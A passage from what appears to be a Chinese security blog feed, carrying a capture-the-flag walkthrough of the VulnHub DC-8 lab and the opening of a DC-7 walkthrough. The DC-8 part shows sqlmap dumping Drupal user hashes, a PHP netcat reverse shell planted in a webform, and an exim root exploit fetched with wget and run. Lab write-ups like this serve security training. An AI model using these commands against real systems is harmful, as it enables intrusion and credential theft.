href="#2-靶场下载地址" class="headerlink" title="2.靶场下载地址"></a>2.靶场下载地址</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">entry</span><span class="token operator">/</span>dc-8<span class="token punctuation">,</span><span class="token number">367</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-启动靶场环境"><a href="#3-启动靶场环境" class="headerlink" title="3.启动靶场环境"></a>3.启动靶场环境</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108150812317.png" alt="image-20240108150812317"></p><p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.52.0&#x2F;24</p><h1 id="二-渗透靶场"><a href="#二-渗透靶场" class="headerlink" title="二.渗透靶场"></a>二.渗透靶场</h1><h2 id="1-目标"><a href="#1-目标" class="headerlink" title="1.目标"></a>1.目标</h2><p>目标就是我们搭建的靶场，靶场IP为：192.168.52.0&#x2F;24</p><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><h3 id="1-寻找靶场真实ip"><a href="#1-寻找靶场真实ip" class="headerlink" title="(1)寻找靶场真实ip"></a>(1)寻找靶场真实ip</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.52.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108151209992.png" alt="image-20240108151209992"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108151227780.png" alt="image-20240108151227780"></p><p>靶场的真实ip地址是192.168.52.130</p><h3 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="(2)探测端口及服务"></a>(2)探测端口及服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-A</span> <span class="token parameter variable">-v</span> -p- <span class="token number">192.168</span>.52.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108151537395.png" alt="image-20240108151537395"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开放了<span class="token number">80</span>端口，存在web服务，Apache httpd 发现开放了<span class="token number">22</span>端口，OpenSSH <span class="token number">7</span><span class="token punctuation">.</span>4p1 Debian <span class="token number">10</span><span class="token operator">+</span>deb9u1 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>也可以使用masscan进行探测</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">masscan <span class="token parameter variable">--rate</span><span class="token operator">=</span><span class="token number">10000</span> <span class="token parameter variable">--ports</span> <span class="token number">0</span>-65535 <span class="token number">192.168</span>.52.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108151820252.png" alt="image-20240108151820252"></p><h3 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="(3)web指纹识别"></a>(3)web指纹识别</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">whatweb <span class="token parameter variable">-v</span> <span class="token number">192.168</span>.52.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108151946306.png" alt="image-20240108151946306"></p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="(1)访问web服务"></a>(1)访问web服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.52.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108152136730.png" alt="image-20240108152136730"></p><p>可以看到和DC-7是一个cms框架</p><h3 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="(2)扫描web服务"></a>(2)扫描web服务</h3><h4 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.52.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108152443953.png" alt="image-20240108152443953"></p><p>使用棱洞3.0指纹识别发现有Drupal</p><h4 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h4><pre class="line-numbers language-none"><code class="language-none">nikto -h http:&#x2F;&#x2F;192.168.52.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108152754770.png" alt="image-20240108152754770"></p><p>使用nikto工具扫描网站结构，发现robots.txt</p><h4 id="3-dirsearch目录扫描"><a href="#3-dirsearch目录扫描" class="headerlink" title="3)dirsearch目录扫描"></a>3)dirsearch目录扫描</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.52.130 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108154220729.png" alt="image-20240108154220729"></p><h3 id="3-渗透测试-1"><a href="#3-渗透测试-1" class="headerlink" title="(3)渗透测试"></a>(3)渗透测试</h3><h4 id="1-首先我们查看Drupal漏洞"><a href="#1-首先我们查看Drupal漏洞" class="headerlink" title="1)首先我们查看Drupal漏洞"></a>1)首先我们查看Drupal漏洞</h4><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.130</span><span class="token operator">/</span>CHANGELOG<span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108154527249.png" alt="image-20240108154527249"></p><p>我们知道版本号是7.67，使用kali进行搜索，但是没有漏洞</p><pre class="line-numbers language-none"><code class="language-none">searchsploit Drupal 7.67<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108154658702.png" alt="image-20240108154658702"></p><h4 id="2-我们访问robots-txt"><a href="#2-我们访问robots-txt" class="headerlink" title="2)我们访问robots.txt"></a>2)我们访问robots.txt</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.52.130/robots.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108154843180.png" alt="image-20240108154843180"></p><p>可以看到是一些登录页面</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.130</span><span class="token operator">/</span>?q<span class="token operator">=</span>user<span class="token operator">/</span>login<span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108155159531.png" alt="image-20240108155159531"></p><p>这个我们先放一放，看能不能有漏洞进行爆破用户名和密码</p><h4 id="3-我们访问目录扫描"><a href="#3-我们访问目录扫描" class="headerlink" title="3)我们访问目录扫描"></a>3)我们访问目录扫描</h4><p>除了&#x2F;user&#x2F;login&#x2F; ，node以外，其他的都没有用</p><p>我们查看node,我们可以看到3行蓝色的字，我们一个一个进行访问，最后发现这里就只加了参数nid，非常可疑，可能存在有SQL注入、xss等漏洞</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.52.130/node<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108160045654.png" alt="image-20240108160045654"></p><h4 id="4-SQL注入"><a href="#4-SQL注入" class="headerlink" title="4)SQL注入"></a>4)SQL注入</h4><p>在nid参数后面加’</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108160215495.png" alt="image-20240108160215495"></p><p>我们可以看到报错了，可能存在报错注入，我们使用sqlmap进行测试</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>u <span class="token string">'http://192.168.52.130/?nid=1'</span> <span class="token comment">--level=5 --risk=3 --batch </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108161257221.png" alt="image-20240108161257221"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108161324729.png" alt="image-20240108161324729"></p><p>我们可以看到存在报错注入</p><p>我们爆破数据库</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>u <span class="token string">'http://192.168.52.130/?nid=1'</span> <span class="token comment">--level=5 --risk=3 --batch --dbs</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108161422185.png" alt="image-20240108161422185"></p><p>有2个数据库，我们爆破d7db数据库</p><p>爆表</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>u <span class="token string">'http://192.168.52.130/?nid=1'</span> <span class="token comment">--level=5 --risk=3 --batch -D 'd7db' --tables</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108161725103.png" alt="image-20240108161725103"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108161744261.png" alt="image-20240108161744261"></p><p>我们可以看到有很多的表，我们爆破users即可</p><p>接着爆字段名</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>u <span class="token string">'http://192.168.52.130/?nid=1'</span> <span class="token comment">--level=5 --risk=3 --batch -D 'd7db' -T 'users' --columns</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108161941021.png" alt="image-20240108161941021"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108162219193.png" alt="image-20240108162219193"></p><p>我们可以看到name和pass，我们想到前面的登录页面，我们进行爆破即可</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>u <span class="token string">'http://192.168.52.130/?nid=1'</span> <span class="token comment">--level=5 --risk=3 --batch -D 'd7db' -T 'users' -C 'name,pass' --dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108162259708.png" alt="image-20240108162259708"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108162317263.png" alt="image-20240108162317263"></p><p>我们看到2个用户名和密码，但是密码是加密的，我们进行解密</p><h4 id="5-john解密"><a href="#5-john解密" class="headerlink" title="5)john解密"></a>5)john解密</h4><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">john <span class="token keyword">password</span><span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108162809678.png" alt="image-20240108162809678"></p><p>爆破出来一个密码是turtle</p><h4 id="6-登录页面"><a href="#6-登录页面" class="headerlink" title="6)登录页面"></a>6)登录页面</h4><p>我们进行登录页面，john turtle，看到登录成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108163009138.png" alt="image-20240108163009138"></p><h4 id="7-反弹shell"><a href="#7-反弹shell" class="headerlink" title="7)反弹shell"></a>7)反弹shell</h4><p>探索发现在WEBFORM处可以编辑并执行PHP代码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.52.130/<span class="token comment">#overlay=node/3/webform/configure</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108163501544.png" alt="image-20240108163501544"></p><p>我们输入反弹shell</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpexec(&quot;nc -e &#x2F;bin&#x2F;bash 192.168.52.152 55555&quot;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108164047374.png" alt="image-20240108164047374"></p><p>将提交重定向行Confirmation page（确认页面）给勾上，然后滑下点保存，联系随便填入联系表单，点击发送，触发PHP代码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108164306558.png" alt="image-20240108164306558"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108164342922.png" alt="image-20240108164342922"></p><p>我们可以看到反弹成功</p><h4 id="8-提权"><a href="#8-提权" class="headerlink" title="8)提权"></a>8)提权</h4><p>我们打开交互模式</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-c</span> <span class="token string">'import pty;pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108164840324.png" alt="image-20240108164840324"></p><p>找查一下suid权限的二进制文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108164902251.png" alt="image-20240108164902251"></p><p>发现存在exim4,我们进行提权</p><p>我们查看exim4版本号</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">exim4 --version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108165444742.png" alt="image-20240108165444742"></p><p>我们使用kali进行搜索</p><p>searchsploit exim 4</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108203835984.png" alt="image-20240108203835984"></p><p>复制一下文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /usr/share/exploitdb/exploits/linux/local/46996.sh MS02423.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开启http服务</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-m</span> http.server <span class="token number">8888</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108204043654.png" alt="image-20240108204043654"></p><p>在DC-7中下载该文件，先跳到tmp目录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /tmp<span class="token function">wget</span> <span class="token number">192.168</span>.52.152:8888/MS02423.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108204219241.png" alt="image-20240108204219241"></p><p>我们查看文件权限</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108204259982.png" alt="image-20240108204259982"></p><p>可以看到文件是不可执行的，我们可以用chmod命令赋予执行权限</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">777</span> MS02423.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108204408567.png" alt="image-20240108204408567"></p><p>我们执行该文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./MS02423.sh <span class="token parameter variable">-m</span> netcat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108204630973.png" alt="image-20240108204630973"></p><p>可以看到现在是root权限</p><p>我们查看flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108204708067.png" alt="image-20240108204708067"></p><h1 id="三-相关资源"><a href="#三-相关资源" class="headerlink" title="三.相关资源"></a>三.相关资源</h1><p>1.靶场下载地址 </p><p>2.nmap</p><p>3.arp-scan </p><p>4.masscan </p><p>5.[ 常用工具篇 ] 渗透神器 whatweb 安装使用详解 </p><p>6.[ 渗透工具篇 ] EHole(棱洞)3.0安装部署及详解（linux &amp; win） </p><p>7.nikto工具的使用</p><p>8.[ 隧道技术 ] 反弹shell的集中常见方式（一）nc反弹shell </p><p>9.实现交互式shell的几种方式</p><p>10.dirsearch目录扫描</p><p>11.SQL注入</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之DC-7</title>
    <link href="http://ms02423.top/2024/01/07/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-7/"/>
    <id>http://ms02423.top/2024/01/07/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-7/</id>
    <published>2024-01-07T05:17:18.000Z</published>
    <updated>2024-01-08T12:47:38.362Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">DC-7 <span class="token keyword">is</span> another purposely built vulnerable lab <span class="token keyword">with</span> the intent <span class="token keyword">of</span> gaining experience <span class="token keyword">in</span> the world <span class="token keyword">of</span> penetration testing<span class="token punctuation">.</span>While this <span class="token keyword">is</span><span class="token string">n't an overly technical challenge, it isn'</span>t exactly easy<span class="token punctuation">.</span>While it<span class="token string">'s kind of a logical progression from an earlier DC release (I won'</span>t tell you which one<span class="token punctuation">)</span><span class="token punctuation">,</span> there <span class="token keyword">are</span> some new concepts involved<span class="token punctuation">,</span> but you will need <span class="token keyword">to</span> figure those out <span class="token keyword">for</span> yourself<span class="token punctuation">.</span> <span class="token punctuation">:</span><span class="token operator">-</span><span class="token punctuation">)</span> <span class="token keyword">If</span> you need <span class="token keyword">to</span> resort <span class="token keyword">to</span> brute forcing <span class="token operator">or</span> dictionary attacks<span class="token punctuation">,</span> you probably won't succeed<span class="token punctuation">.</span>What you will need <span class="token keyword">to</span> do<span class="token punctuation">,</span> <span class="token keyword">is</span> <span class="token keyword">to</span> think <span class="token string">"outside"</span> <span class="token keyword">of</span> the box<span class="token punctuation">.</span>Waaaaaay <span class="token string">"outside"</span> <span class="token keyword">of</span> the box<span class="token punctuation">.</span> <span class="token punctuation">:</span><span class="token operator">-</span><span class="token punctuation">)</span>The ultimate goal <span class="token keyword">of</span> this challenge <span class="token keyword">is</span> <span class="token keyword">to</span> get root <span class="token operator">and</span> <span class="token keyword">to</span> <span class="token keyword">read</span> the one <span class="token operator">and</span> only flag<span class="token punctuation">.</span>Linux skills <span class="token operator">and</span> familiarity <span class="token keyword">with</span> the Linux command <span class="token keyword">line</span> <span class="token keyword">are</span> a must<span class="token punctuation">,</span> <span class="token keyword">as</span> <span class="token keyword">is</span> some experience <span class="token keyword">with</span> basic penetration testing tools<span class="token punctuation">.</span><span class="token keyword">For</span> beginners<span class="token punctuation">,</span> Google can be <span class="token keyword">of</span> great assistance<span class="token punctuation">,</span> but you can always tweet me <span class="token keyword">at</span> @DCAU7 <span class="token keyword">for</span> assistance <span class="token keyword">to</span> get you going again<span class="token punctuation">.</span> But take note<span class="token punctuation">:</span> I wo<span class="token string">n't give you the answer, instead, I'</span>ll give you an idea about how <span class="token keyword">to</span> <span class="token keyword">move</span> forward<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只有一个flag</p><h2 id="2-靶场下载地址"><a href="#2-靶场下载地址" class="headerlink" title="2.靶场下载地址"></a>2.靶场下载地址</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">entry</span><span class="token operator">/</span>dc-7<span class="token punctuation">,</span><span class="token number">356</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-启动靶场环境"><a href="#3-启动靶场环境" class="headerlink" title="3.启动靶场环境"></a>3.启动靶场环境</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107140106370.png" alt="image-20240107140106370"></p><p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.52.0&#x2F;24</p><h1 id="二-渗透靶场"><a href="#二-渗透靶场" class="headerlink" title="二.渗透靶场"></a>二.渗透靶场</h1><h2 id="1-目标"><a href="#1-目标" class="headerlink" title="1.目标"></a>1.目标</h2><p>目标就是我们搭建的靶场，靶场IP为：192.168.52.0&#x2F;24</p><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><h3 id="1-寻找靶场真实ip"><a href="#1-寻找靶场真实ip" class="headerlink" title="(1)寻找靶场真实ip"></a>(1)寻找靶场真实ip</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.52.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107140338185.png" alt="image-20240107140338185"></p><pre class="line-numbers language-none"><code class="language-none">arp-scan -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107140449593-1704607490137-1.png" alt="image-20240107140449593"></p><p>我们知道靶场ip地址为192.168.52.129</p><h3 id="2-探端口及服务"><a href="#2-探端口及服务" class="headerlink" title="(2)探端口及服务"></a>(2)探端口及服务</h3><pre class="line-numbers language-none"><code class="language-none">nmap -A -V -P- 192.168.52.129<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107140725475.png" alt="image-20240107140725475"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开放了<span class="token number">80</span>端口，存在web服务，Apache httpd <span class="token number">2.4</span><span class="token number">.25</span> <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span>发现开放了<span class="token number">22</span>端口，OpenSSH <span class="token number">7</span><span class="token punctuation">.</span>4p1 Debian <span class="token number">10</span><span class="token operator">+</span>deb9u6 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>也可以使用masscan探活端口</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">masscan --rate<span class="token operator">=</span><span class="token number">10000</span> --ports 0-65535 <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.129</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107141039610.png" alt="image-20240107141039610"></p><h3 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="(3)web指纹识别"></a>(3)web指纹识别</h3><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107141158758.png" alt="image-20240107141158758"></p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="(1)访问web服务"></a>(1)访问web服务</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.129</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107141329485.png" alt="image-20240107141329485"></p><p>我们通过wappalyzer发现cms是Drupal 8</p><h3 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="(2)扫描web服务"></a>(2)扫描web服务</h3><h4 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.52.129<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107141449784.png" alt="image-20240107141449784"></p><p>使用棱洞3.0指纹识别发现有Drupal</p><h4 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h4><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">nikto -h http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.129</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107142257358.png" alt="image-20240107142257358"></p><p>使用nikto工具扫描网站结构，发现robots.txt</p><h3 id="3-渗透测试-1"><a href="#3-渗透测试-1" class="headerlink" title="(3)渗透测试"></a>(3)渗透测试</h3><h4 id="1-首先我们查看robots-txt"><a href="#1-首先我们查看robots-txt" class="headerlink" title="1)首先我们查看robots.txt"></a>1)首先我们查看robots.txt</h4><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107142856087.png" alt="image-20240107142856087"></p><p>可以看到是一些登录页面</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.52.129&#x2F;index.php&#x2F;user&#x2F;login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107143030472.png" alt="image-20240107143030472"></p><p>我们想的是暴力破解，但是题目提示我们不能暴力破解</p><p>’<img src="/./../imgs/$%7Bfiilename%7D/image-20240107143201720.png" alt="image-20240107143201720"></p><p>那么这个办法就行不通，我们试试Drupal8漏洞</p><h4 id="2-查看Drupal-8漏洞"><a href="#2-查看Drupal-8漏洞" class="headerlink" title="2)查看Drupal 8漏洞"></a>2)查看Drupal 8漏洞</h4><p>我们使用kali进行搜索Drupal8 </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit Drupal <span class="token number">8</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107143429585.png" alt="image-20240107143429585"></p><p>找了一些Drupal 8 的漏洞 但是好像都不符合。</p><p>我们查看题目提示，说到谷歌可以提供很大的帮助，那么我们使用谷歌进行搜索</p><h4 id="3-google搜索"><a href="#3-google搜索" class="headerlink" title="3)google搜索"></a>3)google搜索</h4><p>我们再次查看页面，可以看到@DC7USER，我们进行搜索</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107143833324.png" alt="image-20240107143833324"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107144032699.png" alt="image-20240107144032699"></p><p>我们进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107144114598.png" alt="image-20240107144114598"></p><p>我们在config.php里面发现是用户名和密码，而且靶场开启了22端口，我们进行ssh</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107144152611.png" alt="image-20240107144152611"></p><h4 id="4-ssh登录"><a href="#4-ssh登录" class="headerlink" title="4)ssh登录"></a>4)ssh登录</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> dc7user@192.168.52.129<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107144641435.png" alt="image-20240107144641435"></p><p>发现可以登录成功</p><p>我们查看里面的文件,发现有两个文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token 